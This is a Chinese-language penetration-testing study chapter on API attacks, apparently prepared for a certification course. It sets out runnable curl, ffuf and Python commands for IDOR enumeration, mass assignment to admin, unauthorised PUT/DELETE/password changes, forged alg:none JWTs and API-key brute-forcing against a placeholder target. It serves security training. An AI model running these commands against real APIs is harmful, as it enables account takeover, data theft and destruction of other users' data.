# 第 43 章 - API 攻擊

## 標籤

- #cpts
- #chapter
- #web
- #api

## 學習目標

- 能從前端、Proxy 流量、API 文件建立 API 地圖。
- 掌握 BOLA/IDOR、Mass Assignment、Method Abuse 的實際測試指令。
- 知道如何用 ffuf 爆破 API endpoint 與 ID。
- 能識別 JWT / API Key / Bearer Token 的驗證弱點。
- 掌握 API 版本差異與未授權存取測試。

---

## 理論基礎：API 攻擊面分類

| 類型 | 說明 | 測試重點 |
|------|------|---------|
| BOLA / IDOR | 換物件 ID 存取他人資源 | 換 /users/123 → /users/124 |
| Mass Assignment | POST/PUT 含隱藏欄位（role/admin） | 在 body 加 role=admin |
| Method Abuse | 允許不預期的 HTTP 方法 | 試 PUT/DELETE/PATCH |
| 缺失版本控制 | 舊版 API 未移除或缺少授權 | /api/v1/ vs /api/v2/ |
| 過度暴露欄位 | 回應包含不應顯示的敏感欄位 | 看完整 JSON 回應 |
| Rate Limit 缺失 | 無速率限制 → 可爆破 | 快速重複請求 |
| 業務邏輯 | 流程跳步、狀態繞過 | 跳過 checkout 步驟等 |

---

## 方法一：API 地圖建立

```bash
# 從 Burp HTTP History 收集 API 端點（手動查看）
# 瀏覽所有功能 → Proxy → 看 /api/ 開頭的請求

# 從前端 JS 找 API endpoint
curl -s http://TARGET/ | grep -oE '"(/api/[^"]+)"' | sort -u
# 抓 HTML 中引用的 /api/ 路徑

# 找 JS 檔案中的 endpoint
curl -s http://TARGET/js/app.js | grep -oE '(GET|POST|PUT|DELETE|PATCH)\s+["/]api[^"'\'']*'

# 從 swagger / OpenAPI 文件取得完整路由
curl -s http://TARGET/api/swagger.json | python3 -m json.tool | grep '"path"'
curl -s http://TARGET/api-docs
curl -s http://TARGET/swagger.yaml

# ffuf 掃 API endpoint
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -u "http://TARGET/api/v1/FUZZ" \
  -mc 200,201,401,403
# -mc 200,201,401,403 → 包含 401/403（代表端點存在但需驗證）
# api/objects.txt → 常見 API 資源名稱（users/products/orders/...）

# 掃 API 版本
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u "http://TARGET/FUZZ" \
  -mc 200,201,401,403
# 找 /api/v1/ /api/v2/ /v1/ /v2/ 等版本路徑
```

---

## 方法二：BOLA / IDOR 測試

```bash
# 取得自己的資源（確認基準）
curl -s http://TARGET/api/users/1 \
  -H "Authorization: Bearer MY_TOKEN"
# → 回應 {"id":1,"email":"me@test.com","role":"user"}

# 換 ID 存取他人資源
curl -s http://TARGET/api/users/2 \
  -H "Authorization: Bearer MY_TOKEN"
# → 若也回傳資料 → IDOR 確認

# 批量掃描 ID 範圍（bash 迴圈）
for id in {1..50}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    http://TARGET/api/users/$id \
    -H "Authorization: Bearer MY_TOKEN")
  echo "ID $id: $response"
done
# 200 → 存在且可存取，403 → 存在但被拒，404 → 不存在

# UUID 型 IDOR（非連續 ID，需要知道目標 UUID）
# 方法：從其他 API 回應中收集 UUID（留言作者 ID 等）
curl -s http://TARGET/api/posts \
  -H "Authorization: Bearer MY_TOKEN" \
  | python3 -m json.tool | grep '"user_id"'
# 收集到其他 user_id → 再用 IDOR 測試

# 物件層級：測試不同資源類型
curl -s http://TARGET/api/orders/500 \
  -H "Authorization: Bearer MY_TOKEN"
# 換 orders / invoices / documents 等資源 ID
```

---

## 方法三：Mass Assignment 測試

```bash
# 先查看正常 POST/PUT 的 JSON body
# 例如更新個人資料
curl -s -X PUT http://TARGET/api/users/me \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

# 嘗試在 body 中加入敏感欄位
curl -s -X PUT http://TARGET/api/users/me \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","role":"admin"}'
# 若回應中 role 變成 admin → Mass Assignment 確認

# 常見隱藏欄位名稱
# role / isAdmin / admin / is_admin / privilege / group
# credit / balance / points（金融類）
# verified / active / enabled（帳號狀態）
# plan / tier / subscription（訂閱層級）

# 測試 POST（註冊）的 Mass Assignment
curl -s -X POST http://TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"test123","email":"h@h.com","role":"admin"}'
# 若成功註冊且 role=admin → 高危 Mass Assignment

# 查詢自己的 profile 確認欄位是否被設定
curl -s http://TARGET/api/users/me \
  -H "Authorization: Bearer MY_TOKEN" \
  | python3 -m json.tool
```

---

## 方法四：HTTP Method 濫用測試

```bash
# 測試不同 HTTP Method（用 OPTIONS 先查）
curl -s -X OPTIONS http://TARGET/api/users/1 \
  -H "Authorization: Bearer MY_TOKEN" -v 2>&1 | grep "Allow:"
# Allow: GET, PUT, DELETE → 顯示允許的方法

# 嘗試 PUT（更新他人資源）
curl -s -X PUT http://TARGET/api/users/2 \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'
# 若成功 → 越權修改他人資料

# 嘗試 DELETE（刪除他人資源）
curl -s -X DELETE http://TARGET/api/users/2 \
  -H "Authorization: Bearer MY_TOKEN"
# 若回 200/204 → 越權刪除

# 嘗試 PATCH（部分更新）
curl -s -X PATCH http://TARGET/api/users/2 \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password":"newpassword"}'

# 嘗試未文件化的 HTTP 方法
curl -s -X HEAD http://TARGET/api/admin/users \
  -H "Authorization: Bearer MY_TOKEN" -v
# HEAD 有時繞過授權但洩露存在
```

---

## 方法五：API 版本差異測試

```bash
# 比較新舊版本 API 的授權差異
# v2 有授權，v1 可能沒有

curl -s http://TARGET/api/v2/admin/users \
  -H "Authorization: Bearer USER_TOKEN"
# → 403 Forbidden

curl -s http://TARGET/api/v1/admin/users \
  -H "Authorization: Bearer USER_TOKEN"
# → 200 → 舊版 API 缺少授權檢查

# 測試無版本前綴的端點
curl -s http://TARGET/admin/users \
  -H "Authorization: Bearer USER_TOKEN"

# 測試 mobile / internal API 端點
curl -s http://TARGET/api/mobile/users \
  -H "Authorization: Bearer USER_TOKEN"
curl -s http://TARGET/api/internal/users \
  -H "X-Internal-Key: test"

# 掃其他 API 版本路徑
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
  -u "http://TARGET/FUZZ/users" \
  -H "Authorization: Bearer USER_TOKEN" \
  -mc 200,201,401,403
```

---

## 方法六：API 認證測試

```bash
# 測試無 Token 存取（缺少認證檢查）
curl -s http://TARGET/api/users/1
# 無 Authorization header → 若仍回 200 → 缺少認證

# JWT Token 分析（見第 37 章）
# 解碼 JWT Payload
echo "eyJhbGci..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# 看 payload 中的 role / user_id / exp 等欄位

# 測試 alg:none
python3 -c "
import base64, json
h = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
p = base64.b64encode(json.dumps({'user_id':1,'role':'admin'}).encode()).decode().rstrip('=')
print(f'{h}.{p}.')
"
# 把輸出結果作為 Token 測試
curl -s http://TARGET/api/admin/users \
  -H "Authorization: Bearer FORGED_TOKEN"

# 測試 API Key 爆破（若端點無速率限制）
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -u "http://TARGET/api/data" \
  -H "X-API-Key: FUZZ" \
  -mc 200
# -H "X-API-Key: FUZZ" → 測試常見 API Key 值

# 測試 Authorization Header 格式差異
curl http://TARGET/api/users -H "Authorization: admin"
curl http://TARGET/api/users -H "Authorization: Token admin"
curl http://TARGET/api/users -H "Authorization: Basic YWRtaW46YWRtaW4="
# Basic YWRtaW46YWRtaW4= = admin:admin 的 base64
```

---

## 方法七：ffuf 爆破 API 端點與 ID

```bash
# 爆破 API 資源路徑
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -u "http://TARGET/api/v1/FUZZ" \
  -H "Authorization: Bearer MY_TOKEN" \
  -mc 200,201,204,401,403 \
  -o api_endpoints.json -of json
# -o api_endpoints.json → 輸出結果到 JSON 檔
# -of json → 輸出格式 JSON

# 找管理端點（掃 admin 相關路徑）
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u "http://TARGET/api/FUZZ" \
  -H "Authorization: Bearer USER_TOKEN" \
  -mc 200,201,403 -fs 0
# -fs 0 → 過濾空回應

# 爆破 ID 空間（數字型）
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
  -u "http://TARGET/api/invoices/FUZZ" \
  -H "Authorization: Bearer MY_TOKEN" \
  -mc 200
# 找可存取的 invoice ID

# 爆破 API 子路徑
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u "http://TARGET/api/users/1/FUZZ" \
  -H "Authorization: Bearer MY_TOKEN" \
  -mc 200,201,403
# 找 /api/users/1/profile / /api/users/1/orders 等子資源
```

---

## API 攻擊決策流程

```
拿到 API Token 後
    ↓
1. 建立 API 地圖（swagger / ffuf / Burp history）
    ↓
2. 找資源 ID 端點（/api/users/{id} / /api/orders/{id}）
    ├─ 換 ID → BOLA/IDOR 測試
    └─ 測所有 HTTP Method → Method Abuse
    ↓
3. 找 POST/PUT 端點
    └─ 加隱藏欄位（role/admin） → Mass Assignment 測試
    ↓
4. 比對不同版本 API
    └─ v1 vs v2 → 舊版缺少授權？
    ↓
5. 無 Token 測試
    └─ 某些 GET 端點是否公開？
```

---

## 速查表

```bash
# API 地圖：swagger
curl http://TARGET/api/swagger.json | python3 -m json.tool | grep path

# ffuf 掃端點
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
  -u "http://TARGET/api/v1/FUZZ" -mc 200,201,401,403

# IDOR 測試
curl http://TARGET/api/users/2 -H "Authorization: Bearer MY_TOKEN"

# Mass Assignment
curl -X PUT http://TARGET/api/users/me \
  -H "Authorization: Bearer MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"x@x.com","role":"admin"}'

# Method 測試
curl -X OPTIONS http://TARGET/api/users/1 -v 2>&1 | grep Allow
curl -X DELETE http://TARGET/api/users/2 -H "Authorization: Bearer MY_TOKEN"

# 舊版 API
curl http://TARGET/api/v1/admin/users -H "Authorization: Bearer USER_TOKEN"

# JWT alg:none
python3 -c "import base64,json; h=base64.b64encode(json.dumps({'alg':'none'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"
```

---

## 關聯筆記

- [[35-Web列舉|第 35 章 - Web 列舉]]
- [[36-Web請求分析|第 36 章 - Web 請求分析]]
- [[37-身分驗證攻擊|第 37 章 - 身分驗證攻擊]]
- [[04-Volume-4-Web-Index|Vol.4 - Web Information Gathering and Attacks]]
